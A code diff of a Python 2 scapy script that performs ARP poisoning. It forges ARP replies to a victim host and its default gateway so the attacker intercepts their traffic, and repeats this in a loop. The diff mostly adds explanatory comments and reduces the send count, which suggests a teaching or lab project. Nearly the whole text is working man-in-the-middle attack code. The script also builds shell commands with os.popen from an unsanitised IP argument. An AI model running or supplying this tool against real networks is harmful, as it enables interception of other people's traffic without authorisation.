@@ -17,18 +17,10 @@ def linux_cmd(cmd):
 
 #get the IP of the dafault GW
 def get_default_gateway():
-    get_gateway_command="ip r | awk \'/^def/{print $3}\'"
+	#gets the 3rd element of a row starting with 'defualt' from result
+	#that originates from running 'ip r'
+    get_gateway_command="ip r | awk \'/^default/{print $3}\'"
     return linux_cmd(get_gateway_command)
-   ####### OLD CODE#################################################################
-   #Read the default gateway directly from /proc. 
-   # with open("/proc/net/route") as fh:
-   #     for line in fh:
-   #         fields = line.strip().split()
-   #         if fields[1] != '00000000' or not int(fields[3], 16) & 2:
-   #             continue
-
-   #		return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
-   #################################################################################
    
 #checks if the program is running by root   
 def isSuperUser():
@@ -38,17 +30,15 @@ def isSuperUser():
    
 #given an IP , get the MAC   
 def get_MAC_from_IP(ip):
-	# ping is optional (sends a WHO_HAS request)
-	os.popen('ping -c 1 %s' % ip)
+	# ping is optional (sends an arp WHO_HAS request)
+	os.popen('ping -c 1 %s' % ip)  #run the given command in the command line
 
 	# grep with a space at the end of IP address to make sure you get a single line
 	fields = os.popen('grep "%s " /proc/net/arp' % ip).read().split()
 	if len(fields) == 6 and fields[3] != "00:00:00:00:00:00":
-		#print str(fields)
 		return fields[3]
 	else:
 		print 'no response from', ip
-		#print str(fields)
 		print 'exiting...'
 		sys.exit(-1)
 
@@ -59,21 +49,21 @@ def get_MAC_of_2_IPs(IP_1,IP_2):
 	MAC_1,MAC_2=get_MAC_from_IP(IP_1),get_MAC_from_IP(IP_2)
 	return (MAC_1,MAC_2)
 
-#this is the attack function
+#this is the attack function. Here we actually send the poisoned ARP frames
 def ARP_poisoning((routerIP,routerMAC),(victimIP,victimMAC),show=False):
-	attackVictimPacket=ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC)
-	attackRouterPacket=ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC)
-				 #send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC)) 
-				 #send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC)) 
+	#opcode = 2 means that this is an ARP reply
+	attackVictimPacket=ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC)  #hardware src is completed by the func
+	attackRouterPacket=ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC)  #hardware src is completed by the func
+
 	if(show):
 		print "***************************************"
 		print "packet to the victim:"
-		print attackVictimPacket.show()
+		print attackVictimPacket.show()  #print the arp packet
 		print "***************************************"
 		
 		print ""
 		print "packet to the router:" 
-		print attackRouterPacket.show()
+		print attackRouterPacket.show()  #print the arp packet
 		print "***************************************"
 		
 	print ("Sending To Victim: "+attackVictimPacket.summary())
@@ -87,7 +77,7 @@ def ARP_poisoning((routerIP,routerMAC),(victimIP,victimMAC),show=False):
 
 def main():
 	
-	times=3000
+	times=30
 	interval=0.05
 	print'=====================================START======================================='	
 
@@ -113,7 +103,7 @@ def main():
 		print '-----------------------------------------------------------------------------'
 		sys.exit(-1)
 		
-	#get victim's UP from terminal	
+	#get victim's IP from terminal	
 	IP_victim	=	sys.argv[1]	
 
 	#get router's IP - default GW or from teminal
@@ -130,9 +120,13 @@ def main():
 	router	=	(IP_router,MAC_router)	
 	victim	=	(IP_victim,MAC_victim)
 	
+	#get the local hostname (the local computer name):
 	hostname = socket.gethostname()
+	#get the self IP address:
 	ip = socket.gethostbyname("%s.local" % hostname)
 	
+	# uuid.getnode() gets the hardware address as a 48-bit positive integer.
+	# The loop breaks the integer into octets and formats them to match the MAC addr. format
 	attacker=	(ip,':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1]))
 	
 	
@@ -161,16 +155,19 @@ def main():
 	
 	
 
-
+	# i = 0 ... times-1
 	for i in xrange(times):
 		printval=str(i+1)
 		printval+=str('\\')+str(times)		
 		print '----------------------------------['+printval+']------------------------------------'
 		
+		#now we'll send poisoned ARP packet to BOTH router and victim
+		#To the router we'll present ourselves as the victim.
+		#To the victim we'll present ourselves as the router.
+		
 		if(i==0):
 			ARP_poisoning(router,victim,True)
 
-			
 	
 		else:	
 			ARP_poisoning(router,victim)
